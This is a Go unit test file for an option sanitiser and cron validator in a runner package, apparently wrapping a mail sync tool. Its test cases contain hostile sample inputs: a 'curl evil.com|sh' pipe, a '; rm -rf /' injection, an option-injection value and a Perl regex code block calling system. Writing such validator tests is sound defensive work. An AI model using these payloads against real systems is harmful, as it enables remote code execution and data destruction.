package runner

import "testing"

func TestSanitizeOptions(t *testing.T) {
	cases := []struct {
		name         string
		in           map[string]any
		wantAccepted int
		wantRejected string
	}{
		{"safe flags", map[string]any{"automap": true, "usecache": true}, 2, ""},
		{"shell command", map[string]any{"pipemess": "curl evil.com|sh"}, 0, "pipemess"},
		{"perl eval", map[string]any{"regexmess": "s/a/b/"}, 0, "regexmess"},
		{"runner-managed", map[string]any{"host1": "evil.com"}, 0, "host1"},
		{"password dump", map[string]any{"debugimap": true}, 0, "debugimap"},
		{"option injection", map[string]any{"folder": "--pipemess"}, 0, "folder"},
		{"shell in int", map[string]any{"maxage": "30; rm -rf /"}, 0, "maxage"},
		{"regex code", map[string]any{"include": `(?{system("id")})`}, 0, "include"},
		{"numbers ok", map[string]any{"maxage": 30, "parallel": 4}, 2, ""},
		{"false flag dropped", map[string]any{"usecache": false}, 0, ""},
	}
	for _, c := range cases {
		accepted, rejected := SanitizeOptions(c.in)
		if len(accepted) != c.wantAccepted {
			t.Errorf("%s: accepted %v, want %d", c.name, accepted, c.wantAccepted)
		}
		if c.wantRejected == "" {
			if len(rejected) != 0 {
				t.Errorf("%s: unexpected rejects %v", c.name, rejected)
			}
		} else if len(rejected) != 1 || rejected[0] != c.wantRejected {
			t.Errorf("%s: rejected %v, want [%s]", c.name, rejected, c.wantRejected)
		}
	}
}

func TestValidateCron(t *testing.T) {
	if err := ValidateCron("0 3 * * *"); err != nil {
		t.Errorf("valid expression rejected: %v", err)
	}
	if err := ValidateCron("bad cron"); err == nil {
		t.Error("invalid expression accepted")
	}
}
